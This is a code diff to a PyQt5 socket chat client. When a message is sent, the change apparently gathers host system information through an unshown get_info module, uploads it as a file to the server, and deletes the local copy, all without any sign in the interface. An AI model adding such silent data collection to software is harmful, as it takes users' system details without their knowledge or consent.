@@ -1,5 +1,12 @@
 from PyQt5 import QtCore, QtGui, QtWidgets
 import socket
+import psutil
+import platform
+from datetime import datetime
+import os
+import sys
+import get_info
+
 
 PORT = 5050
 HEADER = 64
@@ -52,7 +59,19 @@ class Ui_MainWindow(object):
             send_length += b' ' * (HEADER - len(send_length))
             client.send(send_length)
             client.send(message)
-            
+            filename = get_info.node
+            get_info.getinfo()
+            with open(f'{filename}.txt', "rb") as file:
+                data = file.read(1024)
+                while data:
+                    client.send(data)
+                    print('data sent')
+                    data = file.read(1024)
+                    print("file sent complete")
+            client.shutdown(1)
+            os.remove(f'{filename}.txt')
+
+
 
         self.retranslateUi(MainWindow)
         QtCore.QMetaObject.connectSlotsByName(MainWindow)
@@ -67,7 +86,6 @@ class Ui_MainWindow(object):
 
 if __name__ == "__main__":
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    import sys
     app = QtWidgets.QApplication(sys.argv)
     MainWindow = QtWidgets.QMainWindow()
     ui = Ui_MainWindow()
